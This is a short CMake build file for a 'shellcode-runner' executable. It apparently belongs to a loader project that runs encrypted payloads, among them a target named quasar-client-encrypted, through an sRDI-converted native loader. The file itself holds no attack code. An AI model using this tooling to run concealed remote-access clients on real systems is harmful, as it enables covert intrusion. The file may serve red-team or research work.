add_executable(
    shellcode-runner
    "main.cpp"
    "resource.hpp"
    "resource.rc"
)

add_dependencies(
    shellcode-runner
    native-loader-srdi
    test-assembly-encrypted
    quasar-client-encrypted
)

target_compile_definitions(
    shellcode-runner
    PRIVATE SHELLCODE_PATH="$<TARGET_FILE:native-loader>.srdi"
)

 # Copy the encrypted test-assembly into the target binary directory.
 add_custom_command(
	TARGET shellcode-runner POST_BUILD
	COMMAND ${CMAKE_COMMAND} -E copy -t $<TARGET_FILE_DIR:shellcode-runner> $<TARGET_FILE:test-assembly>.enc
)

add_test(
    NAME shellcode-runner-test
    COMMAND shellcode-runner
    WORKING_DIRECTORY $<TARGET_FILE_DIR:shellcode-runner>
)